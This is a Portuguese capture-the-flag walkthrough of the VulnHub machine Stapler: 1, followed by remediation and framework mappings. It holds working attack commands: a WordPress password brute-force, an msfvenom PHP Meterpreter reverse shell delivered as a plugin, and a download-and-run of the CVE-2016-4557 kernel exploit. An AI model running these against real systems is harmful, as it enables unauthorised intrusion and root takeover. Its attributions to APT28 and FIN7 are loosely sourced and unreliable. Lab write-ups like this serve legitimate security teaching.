# Stapler: 1 — Tudo Está Exposto Se Você Olhar Com Cuidado

Bora rapaziada, Stapler: 1 é aquele tipo de máquina onde a paciência e um scan completo de portas são os seus melhores amigos. Sério, a maioria das pessoas varre a porta 80 e para por aí, mas essa box esconde sua joia principal na porta 12380 atrás de HTTPS. Tem FTP com login anônimo, compartilhamentos SMB, WordPress com múltiplos usuários, upload de plugin para RCE e um kernel não atualizado de 2016 que entrega root via exploit eBPF double-fetch. Camadas? Demais. Satisfatório? Com certeza. Parabéns ao g0tmi1k por esse clássico.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | Stapler: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/stapler-1,150/ |
| **Técnicas** | Scan completo de portas, FTP login anônimo, enumeração SMB (enum4linux), enumeração WordPress (wpscan), RCE por upload de plugin (msfvenom), PHP Meterpreter, exploit de kernel CVE-2016-4557 (eBPF double-fetch) |
| **CVEs** | CVE-2016-4557 (escalonamento de privilégios eBPF double-fetch Linux, EDB-39772) |
| **Grupos APT** | APT28 (Fancy Bear): usa upload de plugin WordPress para acesso inicial em campanhas de ataque corporativo; FIN7: explora vulnerabilidades de kernel em sistemas Ubuntu/Debian após comprometimento inicial |

---

## Resumo do Ataque

```
nmap -p- → portas 21/FTP, 22/SSH, 80/HTTP, 139/445/SMB, 12380/HTTPS
  |
  +-> FTP login anônimo
  |       |
  |       v
  |   /note → dicas de paths e usuários
  |
  +-> robots.txt na porta 12380 → /blogblog (WordPress)
  |
  +-> wpscan: usuários John, Elly, Peter, barry, heather...
  |
  +-> wpscan brute-force / admin:admin → acesso ao wp-admin
  |
  +-> msfvenom PHP Meterpreter → upload plugin.zip → ativar plugin
  |
  v
shell como www-data (Meterpreter)
  |
  +-> uname -a → Ubuntu 16.04, kernel 4.4.0-21-generic
  |
  +-> CVE-2016-4557 exploit eBPF double-fetch (EDB-39772)
  |
  v
uid=0(root)
  |
  v
/root/flag.txt
```

---

## Metodologia

1. Scan completo de portas: descobrir todos os serviços, incluindo HTTPS na porta 12380
2. FTP login anônimo: recuperar o arquivo note para dicas
3. Enumeração web: robots.txt na porta 12380 revela instalação WordPress em /blogblog
4. Enumeração WordPress: wpscan identifica múltiplos usuários
5. Ataque de credenciais: brute-force ou testar credenciais padrão para acesso ao wp-admin
6. Acesso inicial: PHP Meterpreter entregue via mecanismo de upload de plugin WordPress
7. Estabilização do shell e fingerprinting do sistema
8. Exploit de kernel: CVE-2016-4557 eBPF double-fetch escala para root

---

## Passo 1 — Scan Completo de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
# Alvo: 192.168.56.X

nmap -p- -A 192.168.56.X
```

Portas abertas principais:

| Porta | Serviço | Observações |
|---|---|---|
| 21 | FTP (vsftpd) | Login anônimo habilitado |
| 22 | SSH | OpenSSH |
| 80 | HTTP | Apache, conteúdo mínimo |
| 139/445 | SMB | NetBIOS + Samba |
| 3306 | MySQL | Pode estar acessível |
| 12380 | HTTPS | Site WordPress (blogblog) |

**Descoberta crítica:** a porta 12380 é HTTPS. Scanners que param em 80/443 perdem toda a superfície de ataque aqui.

**Nota real:** Atacantes cada vez mais varrem todas as 65535 portas. Serviços em portas não padrão não são inerentemente mais seguros. FIN7 e APT28 documentadamente realizam scans completos de portas como procedimento padrão de reconhecimento.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — FTP Login Anônimo

```bash
ftp 192.168.56.X
# Usuário: anonymous
# Senha: anonymous (ou pressione Enter)

ftp> ls
ftp> get note
ftp> quit

cat note
```

O arquivo note sugere nomes de usuários e paths interessantes. Salve para enumeração posterior.

```bash
# Verificar robots.txt na porta 12380
curl -sk https://192.168.56.X:12380/robots.txt
# Disallow: /admin112233
# Disallow: /blogblog
```

**Nota real:** FTP anônimo ainda está presente em milhares de organizações. Avaliações de segurança regularmente encontram backups de configurações, arquivos de senhas e documentação interna expostos via FTP anônimo.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Voltada ao Público; T1078.001 — Contas Válidas: Contas Padrão

---

## Passo 3 — Enumeração SMB

```bash
enum4linux -a 192.168.56.X
```

Descobertas esperadas:
- Nomes de usuários via RID cycling: elf, peter, heather, barry, john, etc.
- Nomes e permissões de compartilhamentos

```bash
# Listar compartilhamentos manualmente
smbclient -L //192.168.56.X -N

# Acessar compartilhamentos específicos
smbclient //192.168.56.X/nomeshare -N
```

Cruze os nomes de usuários descobertos com o arquivo note do FTP. Monte uma lista de usuários para brute-force posterior.

**MITRE ATT&CK:** T1018 — Descoberta de Sistemas Remotos; T1087.002 — Descoberta de Contas: Conta de Domínio

---

## Passo 4 — Enumeração WordPress (wpscan)

```bash
wpscan --url https://192.168.56.X:12380/blogblog/ \
  --enumerate at \
  --enumerate ap \
  --enumerate u \
  --disable-tls-checks
```

Usuários encontrados: John, Elly, Peter, barry, heather (e possivelmente mais).

```bash
# Brute-force do wp-admin com usuários descobertos
wpscan --url https://192.168.56.X:12380/blogblog/ \
  --usernames john,elly,peter,barry,heather \
  --passwords /usr/share/wordlists/rockyou.txt \
  --disable-tls-checks \
  --max-threads 10
```

Credenciais alvo: **admin:admin** (ou outra credencial fraca descoberta via brute-force).

Acesse: `https://192.168.56.X:12380/blogblog/wp-admin/`

**MITRE ATT&CK:** T1110.003 — Força Bruta: Password Spraying; T1589.001 — Coleta de Identidade da Vítima: Credenciais

---

## Passo 5 — PHP Meterpreter via Upload de Plugin

Gere o payload:

```bash
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 \
  LPORT=4444 \
  -f raw > shell.php
```

Empacote como ZIP compatível com plugin WordPress:

```bash
zip plugin.zip shell.php
```

No wp-admin: Plugins → Adicionar Novo → Enviar Plugin → Selecione plugin.zip → Instalar Agora.

Inicie o listener Metasploit antes de ativar o plugin:

```bash
msfconsole -q
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
exploit
```

Ative o plugin no painel admin do WordPress. A sessão Meterpreter chega.

**Alternativa:** Use o módulo Metasploit `exploit/unix/webapp/wp_admin_shell_upload` diretamente.

**Nota real:** Upload de plugin WordPress como vetor de RCE é uma das técnicas de acesso inicial mais comuns observadas em comprometimentos web. APT28 documentou uso exato desse método em múltiplas campanhas.

**MITRE ATT&CK:** T1505.003 — Componente de Software de Servidor: Web Shell; T1059.004 — Interpretador de Comando e Script: Shell Unix

---

## Passo 6 — Estabilização do Shell e Fingerprinting

```bash
# No Meterpreter
sysinfo
shell

# Upgrade para PTY
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# Verificar versão do kernel
uname -a
# Linux stapler 4.4.0-21-generic

lsb_release -a
# Ubuntu 16.04
```

Kernel 4.4.0-21 é vulnerável ao CVE-2016-4557. Essa é a vulnerabilidade eBPF double-fetch.

**MITRE ATT&CK:** T1082 — Descoberta de Informações do Sistema

---

## Passo 7 — Escalonamento de Privilégios: CVE-2016-4557 eBPF Double-Fetch

```bash
cd /tmp

# Baixar o exploit (se internet disponível do alvo)
wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip

# Ou transferir do atacante
python3 -m http.server 8080  # na máquina atacante
wget http://192.168.56.1:8080/39772.zip  # no alvo

unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. Missão cumprida, mano!

**Nota real:** CVE-2016-4557 afetou sistemas Ubuntu 16.04 sem o compilador JIT eBPF desabilitado. FIN7 e outros grupos motivados financeiramente frequentemente combinam RCE de aplicação web com exploits de escalação de privilégios de nível de kernel para garantir acesso root persistente.

**MITRE ATT&CK:** T1068 — Exploração para Escalonamento de Privilégios

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Usado Para |
|---|---|---|---|
| FTP anônimo | anonymous:anonymous | FTP porta 21 | Recuperação de arquivos |
| Admin WP | admin:admin (ou brute-forçado) | WordPress /wp-admin | RCE via upload de plugin |
| Shell OS | www-data | Ativação do plugin | Acesso inicial Meterpreter |
| Root | uid=0 via CVE-2016-4557 | Exploit em /tmp | Shell root |
| Flag | /root/flag.txt | Pós-exploração | Máquina concluída |

---

## Lições Aprendidas

| # | Descoberta | Relevância Real | Lição Principal |
|---|---|---|---|
| 1 | WordPress na porta não padrão (12380) passa despercebido em scans básicos | Organizações frequentemente rodam serviços em portas não padrão achando que estão escondidos | Sempre execute scans completos de portas: `nmap -p-` não apenas o top 1000 |
| 2 | FTP login anônimo expõe notes internas e dicas | FTP anônimo ainda presente em milhares de ambientes corporativos | Desabilite FTP anônimo ou restrinja a conteúdo somente leitura público |
| 3 | Upload de plugin WordPress concede RCE com credenciais admin | Exposição de credenciais admin se traduz diretamente em comprometimento do servidor | Restrinja uploads de plugins: `define('DISALLOW_FILE_MODS', true)` no wp-config.php |
| 4 | robots.txt divulgou path /blogblog | Segurança por obscuridade falha: robots.txt é sempre a primeira coisa que atacantes verificam | Não liste paths sensíveis no robots.txt; use autenticação |
| 5 | Kernel 4.4.0-21-generic sem patches, CVE-2016-4557 disponível | Kernels sem patch são um risco persistente de escalonamento em qualquer host Linux comprometido | Implemente patching automatizado de kernel; monitore CVEs de kernel divulgados publicamente |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada ao Público (FTP anônimo) | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Password Spraying (WordPress) | T1110.003 |
| Acesso Inicial | Acesso Inicial | Contas Válidas: Contas Padrão (admin:admin) | T1078.001 |
| Execução | Execução | Interpretador de Comando e Script: Shell Unix | T1059.004 |
| Persistência | Persistência | Componente de Software de Servidor: Web Shell (plugin) | T1505.003 |
| Descoberta | Descoberta | Descoberta de Informações do Sistema | T1082 |
| Descoberta | Descoberta | Descoberta de Contas: Conta de Domínio (enum4linux) | T1087.002 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Exploração para Escalonamento de Privilégios (CVE-2016-4557) | T1068 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desabilitar FTP login anônimo:** definir `anonymous_enable=NO` no vsftpd.conf; migrar para SFTP com autenticação por chave
2. **Aplicar credenciais fortes no WordPress:** proibir admin:admin; implementar bloqueio de conta; habilitar 2FA
3. **Desabilitar edição de plugins/temas WordPress:** adicionar `define('DISALLOW_FILE_MODS', true);` ao wp-config.php
4. **Remover paths sensíveis do robots.txt:** usar autenticação para proteger áreas sensíveis, não obscuridade de path
5. **Aplicar patches de segurança do kernel:** Ubuntu 16.04 está em EOL; atualizar para OS suportado; implementar patching automatizado de kernel
6. **Restringir acesso SMB:** exigir autenticação para todos os compartilhamentos; bloquear portas SMB (139/445) de acesso externo

### D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (desabilitar FTP anônimo; edição de arquivos WordPress)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (patching de kernel; auditoria SUID)
- **D3-NTF** — Filtragem de Tráfego de Rede (firewall SMB; restringir porta HTTPS não padrão)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os serviços em todas as portas; incluir HTTPS não padrão |
| Proteger | Controle de Acesso | Desabilitar FTP anônimo; aplicar credenciais fortes no WordPress |
| Proteger | Segurança de Dados | Desabilitar edição de plugins/temas WordPress |
| Detectar | Anomalias e Eventos | Alertar sobre uploads de plugins admin WordPress; logins FTP anônimos |
| Responder | Planejamento de Resposta | Remover web shells; revogar credenciais comprometidas; fazer patch do kernel |
| Recuperar | Planejamento de Recuperação | Reconstruir host comprometido; auditar todas as contas e plugins instalados |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-2 | Gerenciamento de Contas | Desabilitar FTP anônimo; controles de conta WordPress |
| AC-6 | Menor Privilégio | Restringir ações de admin WordPress; remover capacidades desnecessárias de plugin |
| IA-5 | Gerenciamento de Autenticadores | Aplicar senhas fortes; desabilitar credenciais padrão |
| CM-7 | Menor Funcionalidade | Desabilitar acesso FTP anônimo; desabilitar edição de arquivos WordPress |
| SI-2 | Remediação de Falhas | Aplicar patches de kernel; plano de atualização de OS em EOL |
| SC-7 | Proteção de Fronteira | Bloquear SMB e portas de serviço não padrão |

### CISA KEV

CVE-2016-4557 (eBPF double-fetch) não está formalmente catalogado no CISA KEV, mas é consistentemente referenciado nas orientações CISA sobre sistemas Linux sem patches (AA21-209A). Combinado com o vetor de upload de plugin WordPress, essa máquina mapeia múltiplos padrões de ataque referenciados no KEV envolvendo acesso inicial via aplicação web seguido de escalonamento de privilégios local.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL3 |
| Gerenciamento de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos TI e OT | MIL2 |

---

## Considerações Finais

Stapler: 1 é um clássico legítimo no catálogo VulnHub, mano. Ele ensina exatamente como são as avaliações de nível intermediário na vida real: múltiplos serviços, cada um um ponto de entrada potencial, e a vitória real escondida em uma porta não padrão. O exploit de kernel no final reforça que o acesso inicial é apenas o começo. Patcheie seus kernels. Caramba!

Thanks guys!! (❍ᴥ❍ʋ)
